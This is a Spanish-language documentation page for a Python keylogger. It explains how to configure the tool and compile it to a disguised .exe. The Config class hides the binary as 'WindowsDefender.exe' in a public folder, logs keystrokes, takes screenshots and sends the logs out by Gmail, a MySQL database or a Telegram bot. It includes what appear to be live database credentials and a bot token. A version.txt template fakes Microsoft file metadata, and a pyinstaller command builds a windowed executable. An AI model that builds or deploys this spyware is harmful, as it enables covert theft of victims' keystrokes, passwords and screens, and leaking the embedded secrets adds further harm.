[Volver al a la documentación](../README.md)

# Custom __[Solo para programadores intemedio de python]__

Proceso de Opciones avanzada del keylogger.

__NOTA:__ Si no sabe no toque.
````py
lass Config:
    def __init__(self):
        self.NAME_KEY = "WindowsDefender"+ ".exe"   # Nombre del Keylogger // Debe ser exactamente igual al Compilado *.exe
        self.NAME_REG = "Windows Defeder REG"                                   # Nombre del Keylogger en el registro
        self.PATH_HIDDEN_LOG = "C:\\Users\\Public\\Security\\Settings" + "\\"           # Ruta del Registro de teclas
        self.LOG_NAME = "reg" + "." + "k"
        self.PATH_HIDDEN_KEY = "C:\\Users\\Public\\Security\\Windows Defender" + "\\"  # Ruta donde se esconderá el KEYLOGGER
        self.PATH_KEY = self.PATH_HIDDEN_KEY + self.NAME_KEY         # <No cambiar>
        self.PATH_LOG = self.PATH_HIDDEN_LOG + self.LOG_NAME       # <No cambiar>
        self.SCREENSHOT = True                                  # Activar o desactivar Screenshot
        self.TIME_SCREENSHOT = 2                                # Tiempo de intervalo de ScreenShot
        self.DELAY  = 10                                                            # tiempo de retraso para evitar sobrecargos al iniciar
        self.TIME_SEND = 1 #[minutos]                                               # Tiempo de envió del registro
        self.MODE_SEND = 2      # 0 = Gmail
                           # 1 = DataBase                                           # Solo se puede usar una opción
                           # 2 = TelegramBot
    class DataBase:  # Clase de Base de datos
        def __init__(self):
            self.HOSTNAME = "bh1g5gnxzw2igrvui8hq-mysql.services.clever-cloud.com"  # HostName
            self.USERNAME = "udwlsyrbtldkznqo"                                      # Username
            self.PASSWORD = "OR2i2dfdgWek0UDiAv4f"                                  # Password
            self.DATABASE = "bh1g5gnxzw2igrvui8hq"                                  # DataBase Name
            self.PORT     = "3306"                                                  # Port
    class Gmail:
        def __init__(self):
            self.GMAIL_1 = "correo1@gmail.com"
            self.PASS_1  = "password1"
            self.GMAIL_2 = "correo2@gmail.com"
            self.PASS_2  = "password2"
            self.GMAIL_3 = "correo3@gmail.com"
            self.PASS_3  = "password3"
          # Solo un correo Recibirá el Registro de Teclas
            self.RECEIVERS = ["receivers1@yahoo.com"]
          # Correos que recibiran el Registro de teclas, pueden ser de 1 a muchos
          # self.RECEIVERS = ["receivers1@yahoo.com","receivers2@gmail.com","receivers3@hotmail.com"]
    class TelegramBot:
        def __init__(self):
            self.ID   = 831233303                                                     # ID Principal [Obligatorio]
            self.ID_2 = 000000000                                                     # ID secundario [Opcional]
            self.ID_3 = 000000000                                                     # ID Terciario  [Opcional]
            self.TOKEN = "1159435940:AAHKZLqDuuk4XBYHUx2GmQei0-RoRvis2v8"             # TOKEN de tu Bot [Obligatorio]
            # Personalize
            self.LEN_TEXT = 2#3600  #    [Longitud maxima por mensaje es de = 4000] # Solo se enviará el registro si sobrepasa la longitud especificada
````

# Proceso de conversión: `*.py a *.exe`
Se utilizará `pyinstaller`
1. En la carpeta principal encontrará dos archivos, uno llamado `icon.ico` y el otro `version.txt`, éstos 2 archivos son importantes para la conversión del `*.py a *.exe`.
    - `icon.ico` = El icono que tendrá el keylogger al ser convertido
    - `version.txt` = Información detallada del keyloger.
    
    Si el siguiente proceso se realiza con exito, el keylogger estará disfrazado así como las siguientes imagenes.
    

    ![Imagen1](https://i.imgur.com/MQAiVnJ.png)
    ![Imagen2](https://i.imgur.com/mTBByRy.png)

    ![Imagen1](https://i.imgur.com/wGTfC4T.png)
    ![Imagen2](https://i.imgur.com/Txt3QFS.png)





    Toda esa información puede ser modificada en el archivo de la plantilla `version.txt`
2. __Disfraz _[Información]_:__ El el siguiente archivo `version.txt`, puedes modificar la información del `*.exe` la cual se supone que de ser creible.
````r
VSVersionInfo(
  ffi=FixedFileInfo(
    filevers=(6, 1, 7601, 17514),
    prodvers=(6, 1, 7601, 17514),
    mask=0x3f,
    flags=0x0,
    OS=0x40004,
    fileType=0x1,
    subtype=0x0,
    date=(0, 0)
    ),
  kids=[
    StringFileInfo(
      [
      StringTable(
        u'040904B0',
        [StringStruct(u'CompanyName', u'Microsoft CorpoKeyloggerion'),
        StringStruct(u'FileDescription', u'Windows Security Health Host Key'),
        StringStruct(u'FileVersion', u'6.1.7601.17514 (win7sp1_rtm.101119-1850)'),
        StringStruct(u'InternalName', u'Windows Defender'),
        StringStruct(u'LegalCopyright', u'\xa9 Microsoft CorpoKeyloggerion. All rights reserved.'),
        StringStruct(u'OriginalFilename', u'SecurityHealthHostKey.exe'),
        StringStruct(u'ProductName', u'Microsoft\xae Windows\xae OpeKeyloggering System'),
        StringStruct(u'ProductVersion', u'6.1.7601.17514')])
      ]), 
    VarFileInfo([VarStruct(u'Translation', [1033, 1200])])
  ]
)
````




3. __Conversión final:__
Mediante Consola debe dirigirse a la carpeta principal.
Los requisitos es tener instalada la librería `pyinstaller`, porfavor mire un tutorial antes de hacer éste proceso, la linea de comando recomendada es la siguiente:


````bat
pyinstaller --clean   --distpath "EXE" -F --windowed --icon icon.ico --version-file version.txt "Tu nombre custom".py
````